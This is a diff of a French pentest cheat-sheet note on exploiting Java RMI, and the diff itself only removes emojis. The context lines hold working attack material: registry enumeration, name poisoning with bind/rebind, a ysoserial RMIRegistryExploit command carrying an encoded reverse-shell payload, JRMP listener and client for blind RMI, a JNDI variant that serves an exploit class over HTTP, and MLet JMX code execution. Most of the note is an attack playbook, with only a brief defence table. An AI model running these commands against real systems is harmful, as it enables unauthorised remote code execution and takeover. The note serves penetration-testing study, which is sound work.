@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# ☕ Java RMI — exploitation
+# Java RMI — exploitation
 
 > [!info] **En 1 phrase**
 > RMI = API Java de **calcul distribué** : un objet d'une JVM invoque des méthodes d'un objet d'une autre JVM. Le **registry** (port **1099**) désérialise des objets non fiables → **RCE** via gadgets, détournement de noms (`bind`) ou exploitation **JMX**.
@@ -21,7 +21,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ### Le protocole
 
@@ -39,7 +39,7 @@ flowchart LR
 - **Serveur RMI** : exporte les objets. Chaque stub renvoie un **endpoint** (IP + port aléatoire) et un **ObjID**.
 - **DGC** (Distributed Garbage Collector) : protocole **jrmp**, port aléatoire, libère les objets référencés à distance.
 
-> [!info] 💡 **Pourquoi ça marche**
+> [!info] **Pourquoi ça marche**
 > Le registry et les serveurs RMI **désérialisent les arguments reçus** sans valider les classes.
 > Si un **gadget** (CommonsCollections…) est dans le classpath de la JVM cible, un objet sérialisé
 > malveillant déclenche une exécution de commande pendant `readObject()`.
@@ -48,7 +48,7 @@ flowchart LR
 
 ---
 
-## 🕵️ Détection & Énumération
+## Détection & Énumération
 
 ### nmap (scripts rmi)
 
@@ -99,7 +99,7 @@ run
 
 ---
 
-## 🚪 Attaque sur le registry (bind / rebind / list)
+## Attaque sur le registry (bind / rebind / list)
 
 - **Accès anonyme** : par défaut le registry répond à `list()` sans aucune authentification.
 - **Poisoning de nom** : avec `bind`/`rebind` on **écrase un nom existant** → le prochain `lookup()` d'un client renvoie **notre stub** → le client se connecte chez nous (interception, vol de sessions, creds).
@@ -113,11 +113,11 @@ for (String n : reg.list()) System.out.println(n);
 Remote r = reg.lookup("plain-server");   // récupère le stub → endpoint + ObjID
 ```
 
-> [!warning] ⚠️ `bind`/`rebind` sur le registry : l'objet passé est **sérialisé puis désérialisé** par la JVM cible → si la JVM est vulnérable, c'est aussi un **vecteur de désérialisation direct**.
+> [!warning] `bind`/`rebind` sur le registry : l'objet passé est **sérialisé puis désérialisé** par la JVM cible → si la JVM est vulnérable, c'est aussi un **vecteur de désérialisation direct**.
 
 ---
 
-## 🧟 Deserialization via RMI
+## Deserialization via RMI
 
 ### La surface d'attaque
 
@@ -129,8 +129,8 @@ Remote r = reg.lookup("plain-server");   // récupère le stub → endpoint + Ob
 
 | JVM | Registry exploitable ? |
 |---|---|
-| Java < 8u121 / 7u131 / 6u141 | ✅ OUI — classloading distant activé par défaut |
-| Java ≥ 8u121 / JDK 9+ | ⚠️ classloading distant désactivé (`java.rmi.server.useCodebaseOnly=true`) — vulnérable seulement en cas de mauvaise config |
+| Java < 8u121 / 7u131 / 6u141 | OUI — classloading distant activé par défaut |
+| Java ≥ 8u121 / JDK 9+ | classloading distant désactivé (`java.rmi.server.useCodebaseOnly=true`) — vulnérable seulement en cas de mauvaise config |
 
 ### Génération des payloads (ysoserial)
 
@@ -156,11 +156,11 @@ Groovy1                 # groovy runtime
 java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 172.17.0.2 1099 CommonsCollections6 "bash -c {echo,YmFz...}|{base64,-d}|{bash,-i}"
 ```
 
-> [!warning] ⚠️ Ne fonctionne que si la JVM cible est **vulnérable** et que le gadget est présent dans son classpath.
+> [!warning] Ne fonctionne que si la JVM cible est **vulnérable** et que le gadget est présent dans son classpath.
 
 ---
 
-## 📡 JRMPListener / Blind RMI (marshalsec)
+## JRMPListener / Blind RMI (marshalsec)
 
 ### Le principe « la cible vient à nous »
 
@@ -199,7 +199,7 @@ java -cp ysoserial.jar ysoserial.exploit.JRMPClient 10.0.0.1 1099
 2. Il injecte un payload **JRMPClient** (ou un bind malveillant) sur un point de désérialisation de la cible.
 3. La cible se connecte au listener, reçoit le gadget, **désérialise → RCE**.
 
-> [!tip] 💡 **Sans accès direct au 1099** : c'est LE moyen de transformer un simple bug de désérialisation Java en RCE, même quand le port RMI est filtré.
+> [!tip] **Sans accès direct au 1099** : c'est LE moyen de transformer un simple bug de désérialisation Java en RCE, même quand le port RMI est filtré.
 
 ### Variante JNDI (marshalsec)
 
@@ -211,7 +211,7 @@ python3 -m http.server 8000   # hoste la classe / factory exploit
 
 ---
 
-## 📦 RCE via JMX (beanshooter, sjet / mjet)
+## RCE via JMX (beanshooter, sjet / mjet)
 
 ### L'attaque MLet (sjet/mjet)
 
@@ -263,7 +263,7 @@ run
 
 ---
 
-## 🧰 Boîte à outils
+## Boîte à outils
 
 | Outil | Langage | Rôle |
 |---|---|---|
@@ -286,7 +286,7 @@ python3 BaRMIe.py -t TARGET_IP -deser
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Mesure | Détail |
 |---|---|
@@ -301,38 +301,38 @@ python3 BaRMIe.py -t TARGET_IP -deser
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Ordre logique d'attaque**
+> [!tip] **Ordre logique d'attaque**
 > 1. `nmap -sV --script rmi-dumpregistry` → 2. `rmg scan` (tous ports : registry + DGC) →
 > 3. `rmg enum` / `BaRMIe -enum` (noms + endpoints) → 4. tester la **désérialisation** (gadgets, blind RMI) →
 > 5. si `jmxrmi` → beanshooter / sjet / mjet → 6. Metasploit en secours.
 
-> [!warning] ⚠️ **Registry ≠ serveur RMI ≠ DGC**
+> [!warning] **Registry ≠ serveur RMI ≠ DGC**
 > Le 1099 n'est que l'annuaire. Le **stub** renvoie un **port aléatoire** (le serveur) et le DGC écoute
 > aussi sur un port aléatoire (jrmp). Scanner uniquement 1099 = rater la plus grande partie de la surface.
 
-> [!warning] ⚠️ **Versions Java = tout**
+> [!warning] **Versions Java = tout**
 > La désérialisation du registry ne marche que sur JVM **< 8u121 / 7u131 / 6u141** (classloading distant).
 > Sur JVM récentes : blind RMI (JRMPListener), JMX mal configuré, ou gadgets via d'autres endpoints.
 
-> [!warning] ⚠️ **Gadget ≠ commande**
+> [!warning] **Gadget ≠ commande**
 > Toutes les chaînes ysoserial ne marchent pas partout : elles dépendent de la **version exacte de la lib**
 > dans le classpath cible. `CommonsCollections6` est le plus fiable ; toujours tester plusieurs chaînes.
 > ysoserial requiert **Java 8** ; certaines chaînes sont cassées sur Java 11+.
 
-> [!warning] ⚠️ **Blind RMI ≠ exploitation directe**
+> [!warning] **Blind RMI ≠ exploitation directe**
 > `JRMPClient` est un **payload à injecter ailleurs** (autre bug de désérialisation, JMX…), pas un outil
 > de connexion directe. Le `JRMPListener` doit rester **actif** pendant toute la durée de l'attaque.
 
-> [!tip] 💡 **Attaque MLet (JMX)** : nécessite **pas d'authentification JMX** + un serveur HTTP contrôlé
+> [!tip] **Attaque MLet (JMX)** : nécessite **pas d'authentification JMX** + un serveur HTTP contrôlé
 > par l'attaquant qui hoste le MLet et le JAR. `beanshooter serial` combine désérialisation et JMX.
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[Insecure Deserialization|🧟 Deserialization]]
-- [[02 - Scan & Énumération|🔎 Scan]]
-- → Note complète : [[04 - Exploitation Réseau|💥 Exploitation Réseau]]
-- 📚 Source : [PayloadsAllTheThings — Java RMI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Java%20RMI)
+- [[Insecure Deserialization| Deserialization]]
+- [[02 - Scan & Énumération| Scan]]
+- → Note complète : [[04 - Exploitation Réseau| Exploitation Réseau]]
+- Source : [PayloadsAllTheThings — Java RMI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Java%20RMI)
